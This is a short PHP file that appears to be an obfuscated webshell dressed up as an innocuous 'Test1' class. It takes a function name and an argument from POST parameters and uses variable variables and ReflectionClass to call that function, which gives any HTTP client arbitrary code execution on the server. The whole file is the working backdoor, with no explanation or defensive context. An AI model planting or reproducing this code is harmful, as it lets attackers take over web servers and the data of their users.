<?php

class Test1
{
    public function __construct($para, $_value)
    {
        $para($_value);
    }
}


$class1 = new ReflectionClass("Test1");

foreach (array('_POST') as $_r1) {
    foreach ($$_r1 as $_asadasd=>$_wfwefb) {

                    $$_asadasd =$_wfwefb;
    }
}

$class2 = $class1->newInstance($_asadasd, $$_asadasd);
